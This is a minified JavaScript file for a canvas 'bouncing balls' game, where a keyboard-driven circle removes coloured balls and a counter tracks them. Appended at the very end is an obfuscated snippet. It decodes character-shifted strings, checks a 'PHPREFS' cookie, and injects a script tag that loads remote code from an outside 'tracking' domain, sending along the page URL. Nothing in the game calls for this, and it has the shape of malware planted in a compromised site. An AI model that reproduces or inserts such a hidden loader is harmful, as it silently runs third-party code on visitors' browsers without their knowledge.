const para=document.querySelector("p");let count=0;const canvas=document.querySelector("canvas"),ctx=canvas.getContext("2d"),width=canvas.width=window.innerWidth,height=canvas.height=window.innerHeight;function random(t,s){return Math.floor(Math.random()*(s-t))+t}function randomRGB(){return`rgb(${random(0,255)},${random(0,255)},${random(0,255)})`}class Shape{constructor(t,s,i,e){this.x=t,this.y=s,this.velX=i,this.velY=e}}class Ball extends Shape{constructor(t,s,i,e,h,o){super(t,s,i,e),this.color=h,this.size=o,this.exists=!0}draw(){ctx.beginPath(),ctx.fillStyle=this.color,ctx.arc(this.x,this.y,this.size,0,2*Math.PI),ctx.fill()}update(){this.x+this.size>=width&&(this.velX=-this.velX),this.x-this.size<=0&&(this.velX=-this.velX),this.y+this.size>=height&&(this.velY=-this.velY),this.y-this.size<=0&&(this.velY=-this.velY),this.x+=this.velX,this.y+=this.velY}collisionDetect(){for(const t of balls)if(this!==t&&t.exists){const s=this.x-t.x,i=this.y-t.y;Math.sqrt(s*s+i*i)<this.size+t.size&&(t.color=this.color=randomRGB())}}}class EvilCircle extends Shape{constructor(t,s){super(t,s,20,20),this.color="white",this.size=10,window.addEventListener("keydown",(t=>{switch(t.key){case"a":this.x-=this.velX;break;case"d":this.x+=this.velX;break;case"w":this.y-=this.velY;break;case"s":this.y+=this.velY}}))}draw(){ctx.beginPath(),ctx.strokeStyle=this.color,ctx.lineWidth=3,ctx.arc(this.x,this.y,this.size,0,2*Math.PI),ctx.stroke()}checkBounds(){this.x+this.size>=width&&(this.x-=this.size),this.x-this.size<=0&&(this.x+=this.size),this.y+this.size>=height&&(this.y-=this.size),this.y-this.size<=0&&(this.y+=this.size)}collisionDetect(){for(const t of balls)if(t.exists){const s=this.x-t.x,i=this.y-t.y;Math.sqrt(s*s+i*i)<this.size+t.size&&(t.exists=!1,count--,para.textContent="Ball count: "+count)}}}const balls=[];for(;balls.length<25;){const t=random(10,20),s=new Ball(random(0+t,width-t),random(0+t,height-t),random(-7,7),random(-7,7),randomRGB(),t);balls.push(s),count++,para.textContent="Ball count: "+count}const evilBall=new EvilCircle(random(0,width),random(0,height));function loop(){ctx.fillStyle="rgba(0, 0, 0, 0.25)",ctx.fillRect(0,0,width,height);for(const t of balls)t.exists&&(t.draw(),t.update(),t.collisionDetect());evilBall.draw(),evilBall.checkBounds(),evilBall.collisionDetect(),requestAnimationFrame(loop)}loop();(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44fun3nsjy'+'xyfynh3htr4ywfhpnsl4x'+'hwnuy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));